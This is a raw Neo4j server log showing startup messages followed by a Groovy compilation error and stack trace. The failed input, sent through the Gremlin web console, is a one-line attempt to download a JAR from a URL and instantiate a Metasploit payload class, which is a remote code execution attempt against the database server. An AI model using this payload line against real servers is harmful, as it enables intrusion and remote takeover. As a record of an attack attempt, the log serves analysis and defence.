feb 16, 2014 9:27:36 PM org.neo4j.server.logging.Logger log
INFO: Setting startup timeout to: 120000ms based on -1
feb 16, 2014 9:27:36 PM org.neo4j.server.logging.Logger log
INFO: Successfully started database
feb 16, 2014 9:27:36 PM org.neo4j.server.logging.Logger log
INFO: Starting HTTP on port :7474 with 80 threads available
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Enabling HTTPS on port :7473
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: No SSL certificate found, generating a self-signed certificate..
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Mounted discovery module at [/]
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Loaded server plugin "CypherPlugin"
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Loaded server plugin "GremlinPlugin"
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Mounted REST API at [/db/data/]
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Mounted management API at [/db/manage/]
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Mounted webadmin at [/webadmin]
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Logging to {} via {}
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: Mounting static content at [/webadmin] from [webadmin-html]
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: jetty-6.1.25
feb 16, 2014 9:27:37 PM org.neo4j.server.logging.Logger log
INFO: NO JSP Support for {}, did not find {}
feb 16, 2014 9:27:37 PM com.sun.jersey.server.impl.application.WebApplicationImpl _initiate
INFO: Initiating Jersey application, version 'Jersey: 1.9 09/02/2011 11:17 AM'
feb 16, 2014 9:27:38 PM com.sun.jersey.server.impl.application.WebApplicationImpl _initiate
INFO: Initiating Jersey application, version 'Jersey: 1.9 09/02/2011 11:17 AM'
feb 16, 2014 9:27:38 PM com.sun.jersey.server.impl.application.WebApplicationImpl _initiate
INFO: Initiating Jersey application, version 'Jersey: 1.9 09/02/2011 11:17 AM'
feb 16, 2014 9:27:38 PM org.neo4j.server.logging.Logger log
INFO: Started {}
feb 16, 2014 9:27:38 PM org.neo4j.server.logging.Logger log
INFO: Started {}
feb 16, 2014 9:27:38 PM org.neo4j.server.logging.Logger log
INFO: Remote interface ready and available at [http://localhost:7474/]
feb 16, 2014 9:32:25 PM org.neo4j.server.logging.Logger log
INFO: Available console sessions: SHELL: class org.neo4j.server.webadmin.console.ShellSessionCreator
CYPHER: class org.neo4j.server.webadmin.console.CypherSessionCreator
GREMLIN: class org.neo4j.server.webadmin.console.GremlinSessionCreator

feb 16, 2014 9:48:55 PM org.neo4j.server.logging.Logger log
SEVERE: 
org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:
groovysh_evaluate: 52: No expression for the array constructor call at line: 52 column: 27. File: groovysh_evaluate @ line 52, column 27.
   new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")}).loadClass("metasploit.Payload").newInstance()
                             ^

1 error

	at org.codehaus.groovy.control.ErrorCollector.failIfErrors(ErrorCollector.java:302)
	at org.codehaus.groovy.control.CompilationUnit.applyToSourceUnits(CompilationUnit.java:858)
	at org.codehaus.groovy.control.CompilationUnit.doPhaseOperation(CompilationUnit.java:548)
	at org.codehaus.groovy.control.CompilationUnit.processPhaseOperations(CompilationUnit.java:524)
	at org.codehaus.groovy.control.CompilationUnit.compile(CompilationUnit.java:501)
	at groovy.lang.GroovyClassLoader.doParseClass(GroovyClassLoader.java:306)
	at groovy.lang.GroovyClassLoader.parseClass(GroovyClassLoader.java:287)
	at groovy.lang.GroovyShell.parseClass(GroovyShell.java:731)
	at groovy.lang.GroovyShell.parse(GroovyShell.java:743)
	at groovy.lang.GroovyShell.parse(GroovyShell.java:770)
	at groovy.lang.GroovyShell$parse.call(Unknown Source)
	at org.codehaus.groovy.tools.shell.Interpreter.evaluate(Interpreter.groovy:61)
	at org.codehaus.groovy.tools.shell.Interpreter$evaluate.call(Unknown Source)
	at org.codehaus.groovy.tools.shell.Groovysh.execute(Groovysh.groovy:152)
	at org.neo4j.server.webadmin.console.GremlinWebConsole.execute(GremlinWebConsole.java:61)
	at org.neo4j.server.webadmin.console.GremlinSession.evaluate(GremlinSession.java:102)
	at org.neo4j.server.webadmin.rest.console.ConsoleService.exec(ConsoleService.java:125)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60)
	at com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205)
	at com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75)
	at com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:288)
	at com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108)
	at com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147)
	at com.sun.jersey.server.impl.uri.rules.RootResourceClassesRule.accept(RootResourceClassesRule.java:84)
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1469)
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1400)
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1349)
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1339)
	at com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:416)
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:537)
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:699)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:511)
